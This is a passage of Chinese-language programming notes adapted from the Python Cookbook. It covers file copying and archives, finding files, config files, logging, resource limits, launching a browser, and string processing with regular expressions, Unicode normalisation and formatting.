讨论 对于文件元数据信息，copy2()\n这样的函数只能尽自己最大能力来保留它。访问时间、创建时间和权限这些基本信息\n会被保留，但是对于所有者、ACLs、资源 fork 和其他更深层次的文件元信息就说不准\n了，这个还得依赖于底层操作系统类型和用户所拥有的访问权限。你通常不会去使用\nshutil.copytree() 函数来执行系统备份。 使用 copytree() 复制文件夹的一个棘手的问题是对于错误的处理。例如，在复制\n过程中，函数可能会碰到损坏的符号链接，因为权限无法访问文件的问题等等。为了解\n决这个问题，所有碰到的问题会被收集到一个列表中并打包为一个单独的异常，到了最\n后再抛出。下面是一个例子: try:\n  shutil.copytree(src, dst)\nexcept shutil.Error as e:\n  for src, dst, msg in e.args[0]:\n    # src is source name\n    # dst is destination name\n    # msg is error message from exception\n    print(dst, src, msg) 如果你提供关键字参数 ignore_dangling_symlinks=True ，这时候 copytree()\n会忽略掉无效符号链接。\n本节演示的这些函数都是最常见的。不过，shutil 还有更多的和复制数据相关的\n操作。它的文档很值得一看，参考: https://docs.python.org/3/library/shutil.html 创建和解压归档文件 问题 你需要创建或解压常见格式的归档文件（比如.tar, .tgz 或.zip） 解决方案 shutil 模块拥有两个函数——make_archive() 和 unpack_archive() 可派上用\n场: >>> import shutil\n>>> shutil.unpack_archive('Python-3.3.0.tgz')\n>>> shutil.make_archive('py33','zip','Python-3.3.0')\n'/Users/beazley/Downloads/py33.zip'\n>>> make_archive() 的 第 二 个 参 数 是 期 望 的 输 出 格 式。可 以 使 用\nget_archive_formats() 获取所有支持的归档格式列表。例如: >>> shutil.get_archive_formats()\n[('bztar', \"bzip2'ed tar-file\"), ('gztar', \"gzip'ed tar-file\"),\n('tar', 'uncompressed tar file'), ('zip', 'ZIP file')]\n>>> 讨论 Python 还有其他的模块可用来处理多种归档格式（比如 tarfile, zipfile, gzip, bz2）\n的底层细节。不过，如果你仅仅只是要创建或提取某个归档，就没有必要使用底层库\n了。可以直接使用 shutil 中的这些高层函数。\n这些函数还有很多其他选项，用于日志打印、预检、文件权限等等。 通过文件名查找文件 问题 你需要写一个涉及到文件查找操作的脚本，比如对日志归档文件的重命名工具，你\n不想在 Python 脚本中调用 shell，或者你要实现一些 shell 不能做的功能。 解决方案 查找文件，可使用 os.walk() 函数，传一个顶级目录名给它。下面是一个例子，查\n找特定的文件名并答应所有符合条件的文件全路径： #!/usr/bin/env python3.3\nimport os def findfile(start, name): for relpath, dirs, files in os.walk(start): if name in files: full_path = os.path.join(start, relpath, name)\nprint(os.path.normpath(os.path.abspath(full_path))) if __name__ == '__main__': findfile(sys.argv[1], sys.argv[2]) findfile参数为初始查找目录与查找文件名 讨论 os.walk() 方法为我们遍历目录树，每次进入一个目录，它会返回一个三元组，包\n含相对于查找目录的相对路径，一个该目录下的目录名列表，以及那个目录下面的文件\n名列表。\n对于每个元组，只需检测一下目标文件名是否在文件列表中。如果是就使用 os.\npath.join() 合并路径。为了避免奇怪的路径名比如 ././foo//bar ，使用了另外两个\n函数来修正结果。第一个是 os.path.abspath() , 它接受一个路径，可能是相对路径，\n最后返回绝对路径。第二个是 os.path.normpath() ，用来返回正常路径，可以解决双\n斜杆、对目录的多重引用的问题等。\n尽管这个脚本相对于 UNIX 平台上面的很多查找来讲要简单很多，它还有跨平台\n的优势。并且，还能很轻松的加入其他的功能。 读取配置文件 问题 怎样读取普通.ini 格式的配置文件？ 解决方案 configparser 模块能被用来读取配置文件。例如，假设你有如下的配置文件: ; config.ini\n; Sample configuration file\n[installation]\nlibrary=%(prefix)s/lib\ninclude=%(prefix)s/include\nbin=%(prefix)s/bin\nprefix=/usr/local\n# Setting related to debug configuration\n[debug]\nlog_errors=true\nshow_warnings=False\n[server]\nport: 8080\nnworkers: 32\npid-file=/tmp/spam.pid\nroot=/www/root\nsignature:\n=================================\nBrought to you by the Python Cookbook\n================================= 下面是一个读取和提取其中值的例子: >>> from configparser import ConfigParser\n>>> cfg = ConfigParser()\n>>> cfg.read('config.ini')\n['config.ini']\n>>> cfg.sections()\n['installation', 'debug', 'server']\n>>> cfg.get('installation','library')\n'/usr/local/lib'\n>>> cfg.getboolean('debug','log_errors')\nTrue\n>>> cfg.getint('server','port')\n8080\n>>> cfg.getint('server','nworkers')\n32\n>>> print(cfg.get('server','signature'))\n\\=================================\nBrought to you by the Python Cookbook\n\\=================================\n>>> 如果有需要，你还能修改配置并使用 cfg.write() 方法将其写回到文件中。例如: >>> cfg.set('server','port','9000')\n>>> cfg.set('debug','log_errors','False')\n>>> import sys\n>>> cfg.write(sys.stdout) 讨论 配置文件作为一种可读性很好的格式，非常适用于存储程序中的配置数据。在每个\n配置文件中，配置数据会被分组（比如例子中的\"installation\"、\"debug\"和\"server\"）。\n每个分组在其中指定对应的各个变量值。 对于可实现同样功能的配置文件和 Python 源文件是有很大的不同的。首先，配置\n文件的语法要更自由些，下面的赋值语句是等效的: prefix=/usr/local\nprefix: /usr/local 配置文件中的名字是不区分大小写的。例如: >>> cfg.get('installation','PREFIX')\n'/usr/local'\n>>> cfg.get('installation','prefix')\n'/usr/local'\n>>> 在解析值的时候，getboolean() 方法查找任何可行的值。例如下面都是等价的: log_errors = true\nlog_errors = TRUE\nlog_errors = Yes\nlog_errors = 1 或许配置文件和 Python 代码最大的不同在于，它并不是从上而下的顺序执行。文\n件是安装一个整体被读取的。如果碰到了变量替换，它实际上已经被替换完成了。例\n如，在下面这个配置中，prefix 变量在使用它的变量之前或之后定义都是可以的: [installation]\nlibrary=%(prefix)s/lib\ninclude=%(prefix)s/include\nbin=%(prefix)s/bin\nprefix=/usr/local ConfigParser 有个容易被忽视的特性是它能一次读取多个配置文件然后合并成一\n个配置。例如，假设一个用户像下面这样构造了他们的配置文件: ; ~/.config.ini\n[installation]\nprefix=/Users/beazley/test\n[debug]\nlog_errors=False 读取这个文件，它就能跟之前的配置合并起来。如: >>> # Previously read configuration\n>>> cfg.get('installation', 'prefix')\n'/usr/local'\n>>> # Merge in user-specific configuration\n>>> import os\n>>> cfg.read(os.path.expanduser('~/.config.ini'))\n['/Users/beazley/.config.ini']\n>>> cfg.get('installation', 'prefix')\n'/Users/beazley/test'\n>>> cfg.get('installation', 'library')\n'/Users/beazley/test/lib'\n>>> cfg.getboolean('debug', 'log_errors')\nFalse\n>>> 仔细观察下 prefix 变量是怎样覆盖其他相关变量的，比如 library 的设定值。产\n生这种结果的原因是变量的改写采取的是后发制人策略，以最后一个为准。 最后还有很重要一点要注意的是 Python 并不能支持.ini 文件在其他程序（比如\nwindows 应用程序）中的所有特性。 给简单脚本增加日志功能 问题 你希望在脚本和程序中将诊断信息写入日志文件。 解决方案 打印日志最简单方式是使用 logging 模块。 代码中编码可以使用basicConfig, 也可以使用ini配置文件, 如: logging.config.fileConfig('logconfig.ini') logconfig.ini内容: [loggers]\nkeys=root\n[handlers]\nkeys=defaultHandler\n[formatters]\nkeys=defaultFormatter\n[logger_root]\nlevel=INFO\nhandlers=defaultHandler\nqualname=root\n[handler_defaultHandler]\nclass=FileHandler\nformatter=defaultFormatter\nargs=('app.log', 'a')\n[formatter_defaultFormatter]\nformat=%(levelname)s:%(name)s:%(message)s 如果你想修改配置，可以直接编辑文件 logconfig.ini 即可。 讨论 尽管对于 logging 模块而已有很多更高级的配置选项，不过这里的方案对于简单\n的程序和脚本已经足够了。只想在调用日志操作前先执行下 basicConfig() 函数方法，你\n的程序就能产生日志输出了。\n如 果 你 想 要 你 的 日 志 消 息 写 到 标 准 错 误 中， 而 不 是 日 志 文 件 中， 调 用\nbasicConfig() 时不传文件名参数即可。例如: logging.basicConfig(level=logging.INFO) basicConfig() 在程序中只能被执行一次。如果你稍后想改变日志配置，就需要先\n获取 root logger ，然后直接修改它。 给函数库增加日志功能 问题 你想给某个函数库增加日志功能，但是又不能影响到那些不使用日志功能的程序。 解决方案 对于想要执行日志操作的函数库而已，你应该创建一个专属的 logger 对象，并且\n像下面这样初始化配置: # somelib.py\nimport logging\nlog = logging.getLogger(__name__)\nlog.addHandler(logging.NullHandler())\n\n# Example function (for testing)\ndef func():\n  log.critical('A Critical Error!')\n  log.debug('A debug message') 使用这个配置，默认情况下不会打印日志。\n不过，如果配置过日志系统，那么日志消息打印就开始生效，例如: >>> import logging\n>>> logging.basicConfig()\n>>> somelib.func()\nCRITICAL:somelib:A Critical Error!\n>>> 讨论 通常来讲，你不应该在函数库代码中自己配置日志系统，或者是已经假定有个已经\n存在的日志配置了。 调用 getLogger(__name__) 创建一个和调用模块同名的 logger 模块。由于模块都\n是唯一的，因此创建的 logger 也将是唯一的。\nlog.addHandler(logging.NullHandler()) 操作将一个空处理器绑定到刚刚已经\n创建好的 logger 对象上。一个空处理器默认会忽略调用所有的日志消息。因此，如果使\n用该函数库的时候还没有配置日志，那么将不会有消息或警告出现。 还有一点就是对于各个函数库的日志配置可以是相互独立的，不影响其他库的日\n志配置。 实现一个计时器 问题 你想记录程序执行多个任务所花费的时间 解决方案 time 模块包含很多函数来执行跟时间有关的函数。尽管如此，通常我们会在此基\n础之上构造一个更高级的接口来模拟一个计时器 限制内存和 CPU 的使用量 问题 你想对在 Unix 系统上面运行的程序设置内存或 CPU 的使用限制。 解决方案 resource 模块能同时执行这两个任务。例如，要限制 CPU 时间，可以像下面这样\n做: import signal\nimport resource\nimport os\n\ndef time_exceeded(signo, frame):\n  print(\"Time's up!\")\n  raise SystemExit(1)\n\ndef set_max_runtime(seconds):\n  # Install the signal handler and set a resource limit\n  soft, hard = resource.getrlimit(resource.RLIMIT_CPU)\n  resource.setrlimit(resource.RLIMIT_CPU, (seconds, hard))\n  signal.signal(signal.SIGXCPU, time_exceeded)\n\nif __name__ == '__main__':\n  set_max_runtime(15)\n  while True:\n    pass 程序运行时，SIGXCPU 信号在时间过期时被生成，然后执行清理并退出。\n要限制内存使用，设置可使用的总内存值即可，如下: import resource\ndef limit_memory(maxsize):\n  soft, hard = resource.getrlimit(resource.RLIMIT_AS)\n  resource.setrlimit(resource.RLIMIT_AS, (maxsize, hard)) 像这样设置了内存限制后，程序运行到没有多余内存时会抛出 MemoryError 异常。 讨论 在本节例子中，setrlimit() 函数被用来设置特定资源上面的软限制和硬限制。 软限制 是一个值，当超过这个值的时候操作系统通常会发送一个信号来限制或通知该进\n程。 硬限制 是用来指定软限制能设定的最大值。通常来讲，这个由系统管理员通过设置\n系统级参数来决定。尽管硬限制可以改小一点，但是最好不要使用用户进程去修改。 setrlimit() 函数还能被用来设置子进程数量、打开文件数以及类似系统资源的\n限制。更多详情请参考 resource 模块的文档。 需要注意的是本节内容只能适用于 Unix 系统，并且不保证所有系统都能如期工\n作。比如我们在测试的时候，它能在 Linux 上面正常运行，但是在 OS X 上却不能。 启动一个 WEB 浏览器 问题 你想通过脚本启动浏览器并打开指定的 URL 网页 解决方案 webbrowser 模块能被用来启动一个浏览器，并且与平台无关。例如: >>> import webbrowser\n>>> webbrowser.open('http://www.python.org')\nTrue\n>>> 它会使用默认浏览器打开指定网页。如果你还想对网页打开方式做更多控制，还可\n以使用下面这些函数: >>> # Open the page in a new browser window\n>>> webbrowser.open_new('http://www.python.org')\nTrue\n>>>\n>>> # Open the page in a new browser tab\n>>> webbrowser.open_new_tab('http://www.python.org')\nTrue\n>>> 这样就可以打开一个新的浏览器窗口或者标签，只要浏览器支持就行。\n如果你想指定浏览器类型，可以使用 webbrowser.get() 函数来指定某个特定浏览\n器。例如: >>> c = webbrowser.get('firefox')\n>>> c.open('http://www.python.org')\nTrue\n>>> c.open_new_tab('http://docs.python.org')\nTrue\n>>> 对于支持的浏览器名称列表可查阅 Python 文档 讨论 在脚本中打开浏览器有时候会很有用。例如，某个脚本执行某个服务器发布任务，\n你想快速打开一个浏览器来确保它已经正常运行了。或者是某个程序以 HTML 网页格\n式输出数据，你想打开浏览器查看结果。不管是上面哪种情况，使用 webbrowser 模块\n都是一个简单实用的解决方案。","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-Script-programming-and-system-management.html","loc":"/yq-docs-rear-end-python-cookbook-Script-programming-and-system-management.html"},{"title":"字符串操作","text":"分隔字符串为列表 str.split re.split , 见 re split 用于 简单的字符串分割情形，它并不允许有 多个分隔符或者是分隔符周围不确定的空格。\n当你需要更加灵活的切割字符串的时候， 最好使用 re.split() 方法: >>> line = 'asdf fjdk; afed, fjek,asdf, foo' >>> import re\n>>> re.split(r'[;,\\s]\\s*', line)\n['asdf', 'fjdk', 'afed', 'fjek', 'asdf', 'foo'] 当你使用 re.split() 函数时候，\n需要特别注意的是正则表达式中是否包含一个括 号捕获分组。\n如果使用了捕获分组，那么被匹配的文本也将出现在结果列表中: >>> fields = re.split(r'(;|,|\\s)\\s*', line)\n>>> fields\n['asdf', ' ', 'fjdk', ';', 'afed', ',', 'fjek', ',', 'asdf', ',', 'foo']\n>>> 如果你不想保留分割字符串到结果列表中去，但仍然需要使用到括号来分组正则 表达式的话，\n确保你的分组是非捕获分组，形如 (?:...) >>> re.split(r'(?:,|;|\\s)\\s*', line)\n['asdf', 'fjdk', 'afed', 'fjek', 'asdf', 'foo']\n>>> 字符串首尾匹配 str.startswith str. endswith 切片 re.match, 见 re fnmatch.fnmatch, 见 fnmatch fnmatch.fnmatchcase 字符串搜索/匹配 str.find str.endswith str.startswith re.match re.findall re.finditer 定义正则式的时候，通常会利用括号去捕获分组 使用match: >>> datepat = re.compile(r'(\\d+)/(\\d+)/(\\d+)')\n\n>>> m = datepat.match('11/27/2012')\n>>> m\n<_sre.SRE_Match object at 0x1005d2750>\n>>> # Extract the contents of each group\n>>> m.group(0)\n'11/27/2012'\n>>> m.group(1) '11'\n>>> m.group(2) '27'\n>>> m.group(3)\n'2012'\n>>> m.groups()\n('11', '27', '2012') 使用 findall: >>> text\n'Today is 11/27/2012. PyCon starts 3/13/2013.'\n>>> datepat.findall(text)\n[('11', '27', '2012'), ('3', '13', '2013')]\n>>> for month, day, year in datepat.findall(text): ... print('{}-{}-{}'.format(year, month, day)) ...\n2012-11-27\n2013-3-13\n>>> 使用 finditer 获取迭代. 字符串替换/搜索 str.replace re.sub, 见 re sub: >>> text = 'Today is 11/27/2012. PyCon starts 3/13/2013.'\n>>> import re\n>>> re.sub(r'(\\d+)/(\\d+)/(\\d+)', r'\\3-\\1-\\2', text)\n'Today is 2012-11-27. PyCon starts 2013-3-13.'\n>>> 忽略大小写 re.IGNORECASE re.IGNORECASE >>> text = 'UPPER PYTHON, lower python, Mixed Python'\n>>> re.findall('python', text, flags=re.IGNORECASE)\n['PYTHON', 'python', 'Python']\n>>> re.sub('python', 'snake', text, flags=re.IGNORECASE)\n'UPPER snake, lower snake, Mixed snake'\n>>> 最短匹配模式 这个问题一般出现在需要匹配一对分隔符之间的文本的时候 (比如引号包含的字符 串),\n原因是 在正 则表达式中 * 操作符是贪婪的，因此匹配操作会查找最长的可能匹配 >>> str_pat = re.compile(r'\\\"(.*)\\\"')\n>>> text1 = 'Computer says \"no.\"'\n>>> str_pat.findall(text1)\n['no.']\n>>> text2 = 'Computer says \"no.\" Phone says \"yes.\"'\n>>> str_pat.findall(text2)\n['no.\" Phone says \"yes.']\n>>> 为了修正这个问题，可以在模式中的 * 操作符后面加上? 修饰符: >>> str_pat = re.compile(r'\\\"(.*?)\\\"')\n>>> str_pat.findall(text2)\n['no.', 'yes.']\n>>> 使得匹配变成非贪婪模式，从而得到最短的匹配 在一 个模式字符串中，点 (.) 匹配除了换行外的任何字符。\n然而，如果你将点 (.) 号放在开始 与结束符 (比如引号) 之间的时候，那么匹配操作会查找符合模式的最长可能匹配。\n这 样通常会导致很多中间的被开始与结束符包含的文本被忽略掉，并最终被包含在匹配 结果字符串中返回。\n通过在 * 或者 + 这样的操作符后面添加一个 ? 可以强制匹配算法 改成寻找最短的可能匹配。 多行匹配 点 (.) 匹配除了换行外的任何字符 可以修改模式字符串，增加对换行的支持: >>> text1 = '/* this is a comment */'\n>>> text2 = '''/* this is a\n... multiline comment */\n... '''\n\n>>> comment.findall(text1)\n[' this is a comment ']\n>>> comment.findall(text2)\n[]\n>>>\n>>> comment = re.compile(r'/\\*((?:.|\\n)*?)\\*/')\n>>> comment.findall(text2)\n[' this is a\\n multiline comment ']\n>>> (?:.|n) 指定了一个非捕获组 (也就是它定义了一个仅仅用来做 匹配，而不能通过单独捕获或者编号的组)。 re.compile() 函数接受一个标志参数叫 re.DOTALL ，可以让 正则表达式中的点 (.) 匹配包括换行符在内的任意字符 Unicode 文本标准化 在 Unicode 中，某些字符能够用多个合法的编码表示: >>> s1 = 'Spicy Jalape\\u00f1o'\n>>> s2 = 'Spicy Jalapen\\u0303o'\n >>> s1\n'Spicy Jalapeño'\n>>> s2\n'Spicy Jalapeño'\n>>> s1 == s2\nFalse\n>>> len(s1)\n14\n>>> len(s2)\n15\n>>> 文本\"Spicy Jalapeño\"使用了两种形式来表示。\n第一种使用整体字符\"ñ\" (U+00F1)，\n第二种使用拉丁字母\"n\"后面跟一个\"~\"的组合字符 (U+0303)。 在需要比较字符串的程序中使用字符的多种表示会产生问题。为了修正这个问题， 你可以使用 unicodedata 模块先将文本标准化: >>> import unicodedata\n>>> t1 = unicodedata.normalize('NFC', s1) >>> t2 = unicodedata.normalize('NFC', s2) >>> t1 == t2\nTrue\n>>> print(ascii(t1))\n'Spicy Jalape\\xf1o'\n>>> t3 = unicodedata.normalize('NFD', s1) >>> t4 = unicodedata.normalize('NFD', s2) >>> t3 == t4\nTrue\n>>> print(ascii(t3))\n'Spicy Jalapen\\u0303o'\n>>> NFC 表示字符应该是整体组 成 (比如可能的话就使用单一编码) NFD 表示字符应该分解为多个组合字符表示 同样支持扩展的标准化形式 NFKC 和 NFKD，它们在处理某些字符的时 候增加了额外的兼容特性。比如: >>> s = '\\ufb01' # A single character >>> s\n''\n>>> unicodedata.normalize('NFD', s) ''\n# Notice how the combined letters are broken apart here\n>>> unicodedata.normalize('NFKD', s) 'fi'\n>>> unicodedata.normalize('NFKC', s) 'fi'\n>>> 标准化对于任何需要以一致的方式处理 Unicode 文本的程序都是非常重要的 ,\n当 处理来自用户输入的字符串而你很难去控制编码的时候尤其如此。 在清理和过滤文本的时候字符的标准化也是很重要的。\n比如，假设你想清除掉一些 文本上面的变音符的时候 (可能是为了搜索和匹配): >>> t1 = unicodedata.normalize('NFD', s1)\n>>> ''.join(c for c in t1 if not unicodedata.combining(c)) 'Spicy Jalapeno'\n>>> combining() 函数可以测试一个字符是否为和音字符 和音字符, 不知道为什书上这么定义, 实际就是是否为规范的数字字符: 为规范数字字符返回数字 否则返回0 正则使用 Unicode 用于 使用正则表达式处理文本，但是关注的是 Unicode 字符处理 默认情况下 re 模块已经对一些 Unicode 字符类有了基本的支持。\n比如， \\\\d 可表示匹配任意的 unicode 数字字符: >>> import re\n>>> num = re.compile('\\d+')\n>>> # ASCII digits\n>>> num.match('123')\n<_sre.SRE_Match object at 0x1007d9ed0>\n>>> # Arabic digits\n>>> num.match('\\u0661\\u0662\\u0663')\n<_sre.SRE_Match object at 0x101234030>\n>>> 匹配几个不同阿拉伯编码页 面中所有字符: >>> arabic = re.compile('[\\u0600-\\u06ff\\u0750-\\u077f\\u08a0-\\u08ff]+')\n>>> 当执行匹配和搜索操作的时候，最好是先标准化并且清理所有文本为标准化格式.\n但是同样也应该注意一些特殊情况，比如在忽略大小写匹配和大小写 转换时的行为: >>> pat = re.compile('stra\\u00dfe', re.IGNORECASE)\n>>> s = 'straße'\n>>> pat.match(s) # Matches\n<_sre.SRE_Match object at 0x10069d370>\n>>> pat.match(s.upper()) # Doesn't match\n>>> s.upper() # Case folds\n'STRASSE'\n>>> 混合使用 Unicode 和正则表达式通常会让你抓狂。\n如果你真的打算这样做的话，最 好考虑下安装第三方正则式库，\n它们会为 Unicode 的大小写转换和其他大量有趣特性 提供全面的支持，包括模糊匹配。 删除字符串中字符 去掉文本字符串开头，结尾或者中间不想要的字符，比如空白 str.strip 删除开始或结尾的字符 str.lstrip 从左执行删除 str.rstrip 从右执行删除 str.replace 字符串替换 re.sub 字符串正则替换 清理文本字符串 除了上面的, 还有 str.translate 自定义替换 例如: >>> s = 'pýtĥöñ\\fis\\tawesome\\r\\n'\n>>> s\n'pýtĥöñ\\x0cis\\tawesome\\r\\n'\n>>> 第一步是清理空白字符, 空白字符 \\t 和 \\f 已经被重新映射到一个空格。\n回车字符 \\r 直 接被删除。: >>> remap = {\n... ord('\\t') : ' ',\n... ord('\\f') : ' ',\n... ord('\\r') : None # Deleted ... }\n>>> a = s.translate(remap)\n>>> a\n'pýtĥöñ is awesome\\n'\n>>> 使用 dict.fromkeys() 方法构造一个字典，每个 Unicode 和音 符作为键，对应的值全部为 None 。 然后使用 unicodedata.normalize() 将原始输入标准化为分解形式字符。\n然后再 调用 translate 函数删除所有重音符: >>> import unicodedata\n>>> import sys\n>>> cmb_chrs = dict.fromkeys(c for c in range(sys.maxunicode)\n... if unicodedata.combining(chr(c)))\n...\n>>> b = unicodedata.normalize('NFD', a)\n>>> b\n'pýtĥöñ is awesome\\n'\n>>> b.translate(cmb_chrs)\n'python is awesome\\n'\n>>> 同样的技术也可以被用来删除其他类型的字符 (比如控制字符等)。 另一种清理文本的技术涉及到 I/O 解码与编码函数。\n这里的思路是先对文本做一 些初步的清理，然后再结合 encode() 或者 decode() 操作来清除或修改它: >>> a\n'pýtĥöñ is awesome\\n'\n>>> b = unicodedata.normalize('NFD', a)\n>>> b.encode('ascii', 'ignore').decode('ascii')\n'python is awesome\\n'\n>>> 这里的标准化操作将原来的文本分解为单独的和音符。\n接下来的 ASCII 编码/解码 只是简单的一下子丢弃掉那些字符。\n当然，这种方法仅仅只在最后的目标就是获取到文 本对应 ACSII 表示的时候生效。 文本字符清理一个最主要的问题应该是运行的性能。\n一般来讲，代码越简单运行越 快。\n对于简单的替换操作，str.replace() 方法通常是最快的，甚至在你需要多次调用 的时候. 另一方面，如果你需要执行任何复杂字符对字符的重新映射或者删除操作的话， tanslate() 方法会非常的快。 字符串对齐 通过某种对齐方式来格式化字符串 str.ljust str.rjust str.center format 例: >>> text = 'Hello World'\n>>> text.ljust(20)\n'Hello World '\n>>> text.rjust(20)\n'         Hello World'\n>>> text.center(20)\n' Hello World '\n>>> 所有这些方法都能接受一个可选的填充字符: >>> text.rjust(20,'=')\n'=========Hello World'\n\n>>> text.center(20,'*')\n'****Hello World*****'\n>>> 函数 format() 同样可以用来很容易的对齐字符串。你要做的就是使用 <,> 或者 &#94; 字符后面紧跟一个指定的宽度: >>> format(text, '>20')\n' Hello World'\n>>> format(text, '<20')\n'Hello World '\n>>> format(text, '&#94;20')\n' Hello World '\n>>> 如果你想指定一个非空格的填充字符，将它写到对齐字符的前面即可: >>> format(text, '=>20s')\n'=========Hello World'\n>>> format(text, '*&#94;20s')\n'****Hello World*****'\n>>> 当格式化多个值的时候，这些格式代码也可以被用在 format() 方法中: >>> '{:>10s} {:>10s}'.format('Hello', 'World')\n' Hello World'\n>>> format() 函数的一个好处是它不仅适用于字符串。它可以用来格式化任何值，使 得它非常的通用。比如，你可以用它来格式化数字: >>> x = 1.2345\n>>> format(x, '>10')\n' 1.2345'\n>>> format(x, '&#94;10.2f') ' 1.23 '\n>>> 在老的代码中，你经常会看到被用来格式化文本的 % 操作符。比如: >>> '%-20s' % text\n'Hello World '\n>>> '%20s' % text\n' Hello World'\n>>> 但是，在新版本代码中，你应该优先选择 format() 函数或者方法。\nformat() 要比 % 操作符的功能更为强大。\n并且 format() 也比使用 ljust() , rjust() 或 center() 方 法更通用，因为它可以用来格式化任意对象，而不仅仅是字符串 合并/拼接字符串 将几个小的字符串合并为一个大的字符 ''.join(iter) str1 + str2 只是合并少数几个字符串，使用加号 (+) 通常已经足够了: >>> a = 'Is Chicago'\n>>> b = 'Not Chicago?'\n>>> a + ' ' + b\n'Is Chicago Not Chicago?'\n>>> 在源码中将两个字面字符串合并: >>> a = 'Hello' 'World'\n>>> a\n'HelloWorld'\n>>> 使用加号 (+) 操作符去连接大量的字符串的 时候是非常低效率的，因为加号连接会引起内存复制以及垃圾回收操作 注意别使用没必要的字符串连接: print(a + ':' + b + ':' + c) # Ugly\nprint(':'.join([a, b, c])) # Still ugly\nprint(a, b, c, sep=':') # Better 当混合使用 I/O 操作和字符串连接操作的时候，有时候需要仔细研究你的程序。比 如: # Version 1 (string concatenation)\nf.write(chunk1 + chunk2)\n\n# Version 2 (separate I/O operations)\nf.write(chunk1)\nf.write(chunk2) 如果两个字符串很小，那么第一个版本性能会更好些，因为 I/O 系统调用天生就 慢。\n另外一方面，如果两个字符串很大，那么第二个版本可能会更加高效，因为它避免 了创建一个很大的临时结果并且要复制大量的内存块数据。 编写构建大量小字符串的输出代码，你最好考虑下使用生 成器函数，利用 yield 语句产生输出片段: def sample():\n  yield 'Is'\n  yield 'Chicago'\n  yield 'Not'\n  yield 'Chicago?' 支持直接join: text = ''.join(sample()) 字符串中插入变量 format 使用 format: >>> s = '{name} has {n} messages.'\n>>> s.format(name='Guido', n=37)\n'Guido has 37 messages.'\n>>> 如果要被替换的变量能在变量域中找到，那么你可以结合使用 format_map() 和 vars() >>> name = 'Guido'\n>>> n = 37\n>>> s.format_map(vars())\n'Guido has 37 messages.'\n>>> 也适用于对象实例: >>> class Info:\n... def __init__(self, name, n):\n...     self.name = name\n...     self.n = n\n>>> a = Info('Guido',37)\n>>> s.format_map(vars(a))\n'Guido has 37 messages.'\n>>> format 和 format_map() 的一个缺陷就是它们并不能很好的处理变量缺失的情况: >>> s.format(name='Guido')\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nKeyError: 'n'\n>>> 一种避免这种错误的方法是另外定义一个含有 __missing__() 方法的字典对象: class safesub(dict):\n    \"\"\" 防止 key 找不到\"\"\"\n\n    def __missing__(self, key): return '{' + key + '}'\n\n>>> del n # Make sure n is undefined\n>>> s.format_map(safesub(vars()))\n'Guido has {n} messages.'\n>>> 其他方式: % >>> name = 'Guido'\n>>> n = 37\n>>> '%(name) has %(n) messages.' % vars()\n'Guido has 37 messages.'\n>>> 字符串模版: >>> import string\n>>> s = string.Template('$name has $n messages.')\n>>> s.substitute(vars())\n'Guido has 37 messages.'\n>>> format() 和 format_map() 相比较上面这些方案而已更加先进，因此应该 被优先选择。\n使用 format() 方法还有一个好处就是你可以获得对字符串格式化的所有 支持 (对齐，填充，数字格式化等待)，\n而这些特性是使用像模板字符串之类的方案不可 能获得的。 指定列宽格式化 有一些长字符串，想以指定的列宽将它们重新格式化 textwrap 使用 textwrap s = \"Look into my eyes, look into my eyes, the eyes, the eyes, \\ the eyes, not around the eyes, don't look around the eyes, \\ look into my eyes, you're under.\" 格式化: >>> import textwrap\n>>> print(textwrap.fill(s, 70))   # 每行最长 70\n>>> print(textwrap.fill(s, 40))   # 每行最长 40\n>>> print(textwrap.fill(s, 40, initial_indent=' ')) textwrap 模块对于字符串打印是非常有用的，特别是当你希望输出自动匹配终端 大小的时候。\n你可以使用 os.get_terminal_size() 方法来获取终端的大小尺寸。比如: >>> import os\n>>> os.get_terminal_size().columns\n80\n>>> fill() 方法接受一些其他可选参数来控制 tab，语句结尾等。参阅 textwrap 处理 html 和 xml 将 HTML 或者 XML 实体如 &entity; 或 &#code; 替换为对应的文本。再者， 你需要转换文本中特定的字符 (比如 <, >, 或 &) 可以使用 html 在生成 HTML 或者 XML 文本的时候，如果正确的转换特殊标记字符是一个很容 易被忽视的细节。\n特别是当你使用 print() 函数或者其他字符串格式化来产生输出的 时候。\n使用像 html.escape() 的工具函数可以很容易的解决这类问题。 如果你想以其他方式处理文本，还有一些其他的工具函数比如 xml.sax.saxutils. unescapge() 可以帮助你。\n然而，你应该先调研清楚怎样使用一个合适的解析器。\n比 如，如果你在处理 HTML 或 XML 文本，\n使用某个解析模块比如 html.parse 或 xml. etree.ElementTree 已经帮你自动处理了相关的替换细节。 字符串令牌解析 假如你有下面这样一个文本字符串: text = 'foo = 23 + 42 * 10' 为了令牌化字符串，你不仅需要匹配模式，还得指定模式的类型. 例: tokens = [('NAME', 'foo'), ('EQ','='), ('NUM', '23'), ('PLUS','+'),\n          ('NUM', '42'), ('TIMES', '*'), ('NUM', '10')] 利用命名捕获组的正则表达式来定 义所有可能的令牌，包括空格: import re\nNAME = r'(?P<NAME>[a-zA-Z_][a-zA-Z_0-9]*)' NUM = r'(?P<NUM>\\d+)'\nPLUS = r'(?P<PLUS>\\+)'\nTIMES = r'(?P<TIMES>\\*)'\nEQ = r'(?P<EQ>=)'\nWS = r'(?P<WS>\\s+)'\nmaster_pat = re.compile('|'.join([NAME, NUM, PLUS, TIMES, EQ, WS])) ?P<TOKENNAME> 用于给一个模式命名，供后面使用 使用 scanner() >>> scanner = master_pat.scanner('foo = 42')\n>>> scanner.match()\n<_sre.SRE_Match object at 0x100677738>\n>>> _.lastgroup, _.group()\n('NAME', 'foo')","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-String-operation.html","loc":"/yq-docs-rear-end-python-cookbook-String-operation.html"},{"title":"测试、调试和异常","text":"试验还是很棒的，但是调试？就没那么有趣了。事实是，在 Python 测试代码之前\n没有编译器来分析你的代码，因此使的测试成为开发的一个重要部分。本章的目标是讨\n论一些关于测试、调试和异常处理的常见问题。但是并不是为测试驱动开发或者单元测\n试模块做一个简要的介绍。因此，笔者假定读者熟悉测试概念。 测试 stdout 输出 问题 你的程序中有个方法会输出到标准输出中（sys.stdout）。也就是说它会将文本打印\n到屏幕上面。你想写个测试来证明它，给定一个输入，相应的输出能正常显示出来。 解决方案 使用 unittest.mock 模块中的 patch() 函数，使用起来非常简单，可以为单个测\n试模拟 sys.stdout 然后回滚，并且不产生大量的临时变量或在测试用例直接暴露状态\n变量。 作为一个例子，我们在 mymodule 模块中定义如下一个函数: # mymodule.py\ndef urlprint(protocol, host, domain):\n  url = 